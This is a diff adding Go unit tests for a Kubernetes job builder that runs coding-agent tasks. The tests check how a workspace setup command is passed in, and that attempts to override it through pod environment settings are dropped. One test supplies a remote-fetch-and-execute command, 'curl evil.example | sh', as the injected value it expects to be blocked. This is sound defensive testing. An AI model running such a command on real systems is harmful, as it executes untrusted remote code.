@@ -331,6 +331,175 @@ func TestBuildClaudeCodeJob_WorkspaceWithInjectedFilesInvalidPath(t *testing.T) 
 	}
 }
 
+func TestBuildClaudeCodeJob_WorkspaceWithSetupCommand(t *testing.T) {
+	builder := NewJobBuilder()
+	task := &kelosv1alpha1.Task{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-setup-command",
+			Namespace: "default",
+		},
+		Spec: kelosv1alpha1.TaskSpec{
+			Type:   AgentTypeClaudeCode,
+			Prompt: "Hello",
+			Credentials: kelosv1alpha1.Credentials{
+				Type:      kelosv1alpha1.CredentialTypeAPIKey,
+				SecretRef: &kelosv1alpha1.SecretReference{Name: "my-secret"},
+			},
+		},
+	}
+
+	workspace := &kelosv1alpha1.WorkspaceSpec{
+		Repo:         "https://github.com/example/repo.git",
+		SetupCommand: []string{"sh", "-c", "npm ci --prefer-offline"},
+	}
+
+	job, err := builder.Build(task, workspace, nil, task.Spec.Prompt)
+	if err != nil {
+		t.Fatalf("Build() returned error: %v", err)
+	}
+
+	container := job.Spec.Template.Spec.Containers[0]
+	var setupValue string
+	var setupFound bool
+	for _, env := range container.Env {
+		if env.Name == "KELOS_SETUP_COMMAND" {
+			setupFound = true
+			setupValue = env.Value
+		}
+	}
+	if !setupFound {
+		t.Fatal("Expected KELOS_SETUP_COMMAND env var to be set")
+	}
+
+	var decoded []string
+	if err := json.Unmarshal([]byte(setupValue), &decoded); err != nil {
+		t.Fatalf("KELOS_SETUP_COMMAND is not valid JSON: %v (value=%q)", err, setupValue)
+	}
+	if len(decoded) != 3 || decoded[0] != "sh" || decoded[1] != "-c" || decoded[2] != "npm ci --prefer-offline" {
+		t.Errorf("Decoded KELOS_SETUP_COMMAND mismatch: got %v", decoded)
+	}
+}
+
+func TestBuildClaudeCodeJob_WorkspaceWithoutSetupCommand(t *testing.T) {
+	builder := NewJobBuilder()
+	task := &kelosv1alpha1.Task{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-no-setup-command",
+			Namespace: "default",
+		},
+		Spec: kelosv1alpha1.TaskSpec{
+			Type:   AgentTypeClaudeCode,
+			Prompt: "Hello",
+			Credentials: kelosv1alpha1.Credentials{
+				Type:      kelosv1alpha1.CredentialTypeAPIKey,
+				SecretRef: &kelosv1alpha1.SecretReference{Name: "my-secret"},
+			},
+		},
+	}
+
+	workspace := &kelosv1alpha1.WorkspaceSpec{
+		Repo: "https://github.com/example/repo.git",
+	}
+
+	job, err := builder.Build(task, workspace, nil, task.Spec.Prompt)
+	if err != nil {
+		t.Fatalf("Build() returned error: %v", err)
+	}
+
+	container := job.Spec.Template.Spec.Containers[0]
+	for _, env := range container.Env {
+		if env.Name == "KELOS_SETUP_COMMAND" {
+			t.Errorf("KELOS_SETUP_COMMAND should not be set when setupCommand is empty (value=%q)", env.Value)
+		}
+	}
+}
+
+func TestBuildAgentJob_SetupCommandPodOverrideIsDropped(t *testing.T) {
+	builder := NewJobBuilder()
+	task := &kelosv1alpha1.Task{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-setup-override",
+			Namespace: "default",
+		},
+		Spec: kelosv1alpha1.TaskSpec{
+			Type:   AgentTypeClaudeCode,
+			Prompt: "Hello",
+			Credentials: kelosv1alpha1.Credentials{
+				Type:      kelosv1alpha1.CredentialTypeAPIKey,
+				SecretRef: &kelosv1alpha1.SecretReference{Name: "my-secret"},
+			},
+			PodOverrides: &kelosv1alpha1.PodOverrides{
+				Env: []corev1.EnvVar{
+					{Name: "KELOS_SETUP_COMMAND", Value: `["echo","attacker"]`},
+				},
+			},
+		},
+	}
+
+	workspace := &kelosv1alpha1.WorkspaceSpec{
+		Repo:         "https://github.com/example/repo.git",
+		SetupCommand: []string{"sh", "-c", "true"},
+	}
+
+	job, err := builder.Build(task, workspace, nil, task.Spec.Prompt)
+	if err != nil {
+		t.Fatalf("Build() returned error: %v", err)
+	}
+
+	container := job.Spec.Template.Spec.Containers[0]
+	var values []string
+	for _, env := range container.Env {
+		if env.Name == "KELOS_SETUP_COMMAND" {
+			values = append(values, env.Value)
+		}
+	}
+	if len(values) != 1 {
+		t.Fatalf("Expected exactly one KELOS_SETUP_COMMAND env var, got %d (values=%v)", len(values), values)
+	}
+	if !strings.Contains(values[0], `"sh"`) || strings.Contains(values[0], "attacker") {
+		t.Errorf("Built-in KELOS_SETUP_COMMAND should win over PodOverrides.Env, got %q", values[0])
+	}
+}
+
+func TestBuildAgentJob_SetupCommandPodOverrideIsDroppedWhenWorkspaceUnset(t *testing.T) {
+	builder := NewJobBuilder()
+	task := &kelosv1alpha1.Task{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-setup-override-no-workspace-setup",
+			Namespace: "default",
+		},
+		Spec: kelosv1alpha1.TaskSpec{
+			Type:   AgentTypeClaudeCode,
+			Prompt: "Hello",
+			Credentials: kelosv1alpha1.Credentials{
+				Type:      kelosv1alpha1.CredentialTypeAPIKey,
+				SecretRef: &kelosv1alpha1.SecretReference{Name: "my-secret"},
+			},
+			PodOverrides: &kelosv1alpha1.PodOverrides{
+				Env: []corev1.EnvVar{
+					{Name: "KELOS_SETUP_COMMAND", Value: `["sh","-c","curl evil.example | sh"]`},
+				},
+			},
+		},
+	}
+
+	workspace := &kelosv1alpha1.WorkspaceSpec{
+		Repo: "https://github.com/example/repo.git",
+	}
+
+	job, err := builder.Build(task, workspace, nil, task.Spec.Prompt)
+	if err != nil {
+		t.Fatalf("Build() returned error: %v", err)
+	}
+
+	container := job.Spec.Template.Spec.Containers[0]
+	for _, env := range container.Env {
+		if env.Name == "KELOS_SETUP_COMMAND" {
+			t.Errorf("KELOS_SETUP_COMMAND must be dropped from PodOverrides.Env when workspace.setupCommand is unset (got %q)", env.Value)
+		}
+	}
+}
+
 func TestBuildClaudeCodeJob_CustomImageWithWorkspace(t *testing.T) {
 	builder := NewJobBuilder()
 	task := &kelosv1alpha1.Task{
